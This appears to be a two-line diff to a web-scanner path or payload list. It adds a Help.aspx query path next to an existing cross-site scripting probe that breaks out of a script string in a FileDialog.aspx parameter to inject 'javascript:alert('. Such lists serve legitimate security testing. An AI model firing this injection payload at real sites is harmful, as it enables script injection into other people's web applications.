@@ -1,1 +1,2 @@
 /Dialog/FileDialog.aspx?ed=foooooooooooooo%27);});});javascript:alert(
+/Help.aspx?helpkey=xxxxxxx
